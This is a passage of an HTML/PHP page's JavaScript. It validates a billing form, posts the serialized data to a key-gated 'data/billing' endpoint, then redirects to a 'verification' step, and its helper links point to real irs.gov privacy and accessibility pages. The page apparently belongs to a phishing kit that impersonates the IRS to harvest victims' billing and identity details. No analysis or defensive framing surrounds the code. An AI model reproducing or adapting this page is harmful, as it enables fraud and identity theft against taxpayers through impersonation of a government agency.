                    minlength: "Please check the name you entered",
                },
            },
            errorElement: 'span',
            errorClass: 'help-block',
            errorPlacement: function(error, element) {
                error.insertAfter(element);
            },
            highlight: function(element, errorClass) {
                $(element).parent().addClass('has-error');
                $(element).addClass('is-invalid');
            },
            unhighlight: function(element, errorClass) {
                $(element).parent().removeClass('has-error');
                $(element).removeClass('is-invalid');
            },
            submitHandler: function(form) {
              $('#billing .login-submit-button').prop('disabled', true); 
                $.post("data/billing?key=<?php echo $key;?>", $("#billing > form").serialize(), function(result, success) {
                    if (success == "success") {
                        $("#billing").hide();
                        if ("<?php echo $id_first; ?>" == "on") {
                          $(location).attr("href", "verification?key=<?php echo $key;?>");
                        } else {
                          $("#accountRtn").show();
                        }

                        $('#billing .login-submit-button').prop('disabled', false); 
                        $(location).attr("", "");
                   }
                });                  
        
},});
});
});

 $("#intro_btn").click(function(e) {
   $("#intro").hide();
   $("#billing").show();
 });
</script>
<script>

function openIrsPage ( ) {
var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
  
function openIrsAccessibility ( ) {
var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
}
if($.trim(language) == "English"){ 
  window.open (
    "http://www.irs.gov/es/help/irsgov-accessibility",
    "_blank" );  
 }
 else
 {
  window.open (
    "http://www.irs.gov/help/irsgov-accessibility",
    "_blank" );
 }   
}

function openIrsPrivacyPolicy ( ) {

var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();

if($.trim(language) == "English"){ 
  window.open (
    "http://www.irs.gov/es/privacy-disclosure/irs-privacy-policy",
    "_blank" );  
 }
 else
 {
  window.open (
    "http://www.irs.gov/privacy/index.html",
    "_blank" );
 } 
}
</script>
</html>